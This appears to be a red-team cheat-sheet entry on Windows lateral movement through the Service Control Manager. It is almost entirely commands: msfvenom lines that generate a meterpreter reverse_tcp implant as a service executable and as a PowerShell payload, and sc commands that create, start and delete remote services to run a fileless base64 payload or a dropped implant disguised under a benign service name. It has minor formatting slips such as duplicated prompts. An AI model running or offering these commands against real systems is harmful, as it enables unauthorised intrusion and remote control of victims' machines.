# Living off the Land

Search Tag(s): #lateral-movement #service-control-manager #windows

## 01 - Usage

After we generate a reverse/bind shell refer to the techniques to copy the shell via [[Windows Lateral Movement References|SMB]]

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread -f exe-service -o implantsvc.exe

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
```

Here's the following syntax

```
C:\> sc \\<IP> create <ServiceSVC> binpath= "c:\path\to\implantsvc.exe"

C:\> sc \\<IP> start <ServiceSVC>

C:\> sc \\<IP> delete <ServiceSVC>
```

## 02 - Use Cases

### 2.1 - Fileless Implant

```
C:\> sc \\<IP> create pwshpayload binpath= "powershell -E <base64_encoded>"

C:\> sc \\<IP> start pwshpayload

C:\> sc \\<IP> delete pwshpayload
```

### 2.1 - Dropper Implant

```
C:\> sc \\<IP> create TestMaintenance binpath= "c:\path\to\implantsvc.exe"

C:\> C:\> sc \\<IP> start TestMaintenance

C:\> C:\> sc \\<IP> delete TestMaintenance
```

---
## References

- [LOFLCAB: Service Control Manager](https://lofl-project.github.io/loflcab/Binaries/sc/)

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

- [Riccardo Ancarani - Red Team Adventures: Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)

- [nv2lt: Windows Lateral Movement with SMB, PsExec and Alternatives](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)